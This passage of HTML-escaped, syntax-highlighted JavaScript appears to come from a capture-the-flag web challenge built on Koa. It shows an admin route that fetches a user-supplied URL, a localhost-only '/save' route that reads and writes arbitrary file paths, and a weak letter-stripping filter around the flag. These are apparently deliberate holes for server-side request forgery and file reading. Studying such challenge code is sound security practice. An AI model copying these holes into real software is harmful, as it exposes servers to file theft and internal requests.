&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">if&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">ctx&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">session&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">username&lt;/span> &lt;span style="color:#f92672">===&lt;/span> &lt;span style="color:#d88200">&amp;#39;ADMIN&amp;#39;&lt;/span> &lt;span style="color:#f92672">&amp;amp;&amp;amp;&lt;/span> &lt;span style="color:#75af00">ctx&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">query&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">url&lt;/span>&lt;span style="color:#111">){&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75af00">url&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">decodeURI&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">checkUrl&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">ctx&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">query&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">url&lt;/span>&lt;span style="color:#111">))&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">if&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">url&lt;/span> &lt;span style="color:#f92672">===&lt;/span> &lt;span style="color:#d88200">&amp;#39;errorurl&amp;#39;&lt;/span>&lt;span style="color:#111">){&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75af00">ctx&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">response&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">body&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#d88200">&amp;#39;error url&amp;#39;&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">}&lt;/span>&lt;span style="color:#00a8c8">else&lt;/span>&lt;span style="color:#111">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75af00">console&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">log&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;è¯·æ±‚çš„url:&amp;#34;&lt;/span>&lt;span style="color:#f92672">+&lt;/span>&lt;span style="color:#00a8c8">typeof&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">url&lt;/span>&lt;span style="color:#111">)&lt;/span>&lt;span style="color:#f92672">+&lt;/span>&lt;span style="color:#d88200">&amp;#34;:&amp;#34;&lt;/span>&lt;span style="color:#f92672">+&lt;/span>&lt;span style="color:#75af00">url&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">return&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">Promise&lt;/span>&lt;span style="color:#111">(&lt;/span> &lt;span style="color:#75af00">resolve&lt;/span> &lt;span style="color:#111">=&amp;gt;&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">const&lt;/span> &lt;span style="color:#75af00">req&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#75af00">http&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">request&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">url&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#75af00">res&lt;/span> &lt;span style="color:#111">=&amp;gt;&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75af00">res&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">setEncoding&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;utf-8&amp;#39;&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">let&lt;/span> &lt;span style="color:#75af00">data&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#d88200">&amp;#39;&amp;#39;&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">let&lt;/span> &lt;span style="color:#75af00">error&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">if&lt;/span> &lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">res&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">statusCode&lt;/span> &lt;span style="color:#f92672">!==&lt;/span> &lt;span style="color:#ae81ff">200&lt;/span>&lt;span style="color:#111">){&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75af00">error&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">Error&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;è¯·æ±‚å¤±è´¥\n&amp;#39;&lt;/span> &lt;span style="color:#f92672">+&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#d88200">`çŠ¶æ€ç : &lt;/span>&lt;span style="color:#d88200">${&lt;/span>&lt;span style="color:#75af00">res&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">statusCode&lt;/span>&lt;span style="color:#d88200">}&lt;/span>&lt;span style="color:#d88200">`&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">};&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">if&lt;/span> &lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">error&lt;/span>&lt;span style="color:#111">)&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75af00">console&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">error&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">error&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">message&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75af00">res&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">resume&lt;/span>&lt;span style="color:#111">();&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">return&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75af00">res&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">on&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;data&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#75af00">chunk&lt;/span> &lt;span style="color:#111">=&amp;gt;&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75af00">data&lt;/span> &lt;span style="color:#f92672">+=&lt;/span> &lt;span style="color:#75af00">chunk&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">toString&lt;/span>&lt;span style="color:#111">();&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">});&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75af00">res&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">on&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;end&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#00a8c8">async&lt;/span>&lt;span style="color:#111">()&lt;/span> &lt;span style="color:#111">=&amp;gt;&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">let&lt;/span> &lt;span style="color:#75af00">out&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">await&lt;/span> &lt;span style="color:#75af00">WriteResults&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">ctx&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">session&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">sandbox&lt;/span>&lt;span style="color:#111">,&lt;/span>&lt;span style="color:#75af00">data&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75af00">ctx&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">body&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#d88200">&amp;#39;Requst results in :&amp;#39;&lt;/span>&lt;span style="color:#f92672">+&lt;/span>&lt;span style="color:#75af00">out&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">replace&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;tmp&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span>&lt;span style="color:#d88200">&amp;#39;&amp;#39;&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75af00">resolve&lt;/span>&lt;span style="color:#111">();&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">})&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">})&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75af00">req&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">on&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;error&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#00a8c8">function&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">err&lt;/span>&lt;span style="color:#111">){&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75af00">console&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">log&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">err&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">});&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75af00">req&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">end&lt;/span>&lt;span style="color:#111">();&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">});&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">}&lt;/span>&lt;span style="color:#00a8c8">else&lt;/span>&lt;span style="color:#111">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75af00">ctx&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">status&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#ae81ff">403&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75af00">ctx&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">response&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">body&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#d88200">&amp;#39;403: You have not the permission&amp;#39;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">})&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75af00">home&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">get&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;/save&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span>&lt;span style="color:#00a8c8">async&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">ctx&lt;/span>&lt;span style="color:#111">)=&amp;gt;{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">let&lt;/span> &lt;span style="color:#75af00">ip&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#75af00">ctx&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">request&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">ip&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">if&lt;/span> &lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">ip&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">substr&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#ae81ff">0&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#ae81ff">7&lt;/span>&lt;span style="color:#111">)&lt;/span> &lt;span style="color:#f92672">==&lt;/span> &lt;span style="color:#d88200">&amp;#34;::ffff:&amp;#34;&lt;/span>&lt;span style="color:#111">)&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75af00">ip&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#75af00">ip&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">substr&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#ae81ff">7&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">if&lt;/span> &lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">ip&lt;/span> &lt;span style="color:#f92672">!==&lt;/span> &lt;span style="color:#d88200">&amp;#39;127.0.0.1&amp;#39;&lt;/span> &lt;span style="color:#f92672">&amp;amp;&amp;amp;&lt;/span> &lt;span style="color:#75af00">ip&lt;/span> &lt;span style="color:#f92672">!==&lt;/span> &lt;span style="color:#75af00">server_ip&lt;/span>&lt;span style="color:#111">)&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75af00">ctx&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">status&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#ae81ff">403&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75af00">ctx&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">response&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">body&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#d88200">&amp;#39;403: You are not the local user&amp;#39;&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">}&lt;/span>&lt;span style="color:#00a8c8">else&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">let&lt;/span> &lt;span style="color:#75af00">reqbody&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">{&lt;/span>&lt;span style="color:#00a8c8">switch&lt;/span>&lt;span style="color:#f92672">:&lt;/span>&lt;span style="color:#00a8c8">false&lt;/span>&lt;span style="color:#111">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75af00">reqbody&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#75af00">qs&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">parse&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">ctx&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">querystring&lt;/span>&lt;span style="color:#111">,{&lt;/span>&lt;span style="color:#75af00">allowPrototypes&lt;/span>&lt;span style="color:#f92672">:&lt;/span> &lt;span style="color:#00a8c8">false&lt;/span>&lt;span style="color:#111">});&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">if&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">reqbody&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#00a8c8">switch&lt;/span> &lt;span style="color:#f92672">===&lt;/span> &lt;span style="color:#00a8c8">true&lt;/span> &lt;span style="color:#f92672">&amp;amp;&amp;amp;&lt;/span> &lt;span style="color:#75af00">reqbody&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">sandbox&lt;/span> &lt;span style="color:#f92672">&amp;amp;&amp;amp;&lt;/span> &lt;span style="color:#75af00">reqbody&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">opath&lt;/span> &lt;span style="color:#f92672">&amp;amp;&amp;amp;&lt;/span>&lt;span style="color:#75af00">fs&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">existsSync&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">reqbody&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">spath&lt;/span>&lt;span style="color:#111">)){&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">if&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">fs&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">existsSync&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">reqbody&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">sandbox&lt;/span>&lt;span style="color:#111">)){&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75af00">paths&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">opath&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#75af00">fs&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">readdirSync&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">reqbody&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">sandbox&lt;/span>&lt;span style="color:#111">)[&lt;/span>&lt;span style="color:#ae81ff">0&lt;/span>&lt;span style="color:#111">];&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">}&lt;/span>&lt;span style="color:#00a8c8">else&lt;/span> &lt;span style="color:#00a8c8">if&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">fs&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">existsSync&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">reqbody&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">opath&lt;/span>&lt;span style="color:#111">)){&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">let&lt;/span> &lt;span style="color:#75af00">buffer&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75af00">tmp&lt;/span>&lt;span style="color:#111">[&lt;/span>&lt;span style="color:#75af00">reqbody&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">sandbox&lt;/span>&lt;span style="color:#111">][&lt;/span>&lt;span style="color:#d88200">&amp;#39;opath&amp;#39;&lt;/span>&lt;span style="color:#111">]&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#75af00">reqbody&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">opath&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">if&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">/[flag]/&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">test&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">tmp&lt;/span>&lt;span style="color:#111">[&lt;/span>&lt;span style="color:#75af00">reqbody&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">sandbox&lt;/span>&lt;span style="color:#111">][&lt;/span>&lt;span style="color:#d88200">&amp;#39;opath&amp;#39;&lt;/span>&lt;span style="color:#111">])){&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75af00">buffer&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#75af00">tmp&lt;/span>&lt;span style="color:#111">[&lt;/span>&lt;span style="color:#75af00">reqbody&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">sandbox&lt;/span>&lt;span style="color:#111">][&lt;/span>&lt;span style="color:#d88200">&amp;#39;opath&amp;#39;&lt;/span>&lt;span style="color:#111">].&lt;/span>&lt;span style="color:#75af00">replace&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">/f|l|a|g/g&lt;/span>&lt;span style="color:#111">,&lt;/span>&lt;span style="color:#d88200">&amp;#39;&amp;#39;&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">}&lt;/span>&lt;span style="color:#00a8c8">else&lt;/span>&lt;span style="color:#111">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75af00">buffer&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#75af00">reqbody&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">opath&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">let&lt;/span> &lt;span style="color:#75af00">opath&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#75af00">paths&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">opath&lt;/span>&lt;span style="color:#f92672">?&lt;/span> &lt;span style="color:#75af00">paths&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">opath&lt;/span> &lt;span style="color:#f92672">:&lt;/span> &lt;span style="color:#75af00">buffer&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">let&lt;/span> &lt;span style="color:#75af00">text&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#75af00">fs&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">readFileSync&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">opath&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#d88200">&amp;#39;utf8&amp;#39;&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">await&lt;/span> &lt;span style="color:#75af00">WriteResults&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">reqbody&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">spath&lt;/span>&lt;span style="color:#111">,&lt;/span>&lt;span style="color:#75af00">text&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">}&lt;/span>&lt;span style="color:#00a8c8">else&lt;/span>&lt;span style="color:#111">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">return&lt;/span> &lt;span style="color:#00a8c8">false&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">})&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75af00">home&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">get&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;/delete&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span>&lt;span style="color:#00a8c8">async&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">ctx&lt;/span>&lt;span style="color:#111">)=&amp;gt;{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">if&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">ctx&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">session&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">username&lt;/span> &lt;span style="color:#f92672">===&lt;/span> &lt;span style="color:#d88200">&amp;#39;ADMIN&amp;#39;&lt;/span> &lt;span style="color:#f92672">&amp;amp;&amp;amp;&lt;/span> &lt;span style="color:#75af00">fs&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">existsSync&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">ctx&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">session&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">sandbox&lt;/span>&lt;span style="color:#f92672">+&lt;/span>&lt;span style="color:#d88200">&amp;#39;/results.txt&amp;#39;&lt;/span>&lt;span style="color:#111">)){&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75af00">DeleteResults&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">ctx&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">session&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">sandbox&lt;/span>&lt;span style="color:#111">);&lt;/span>
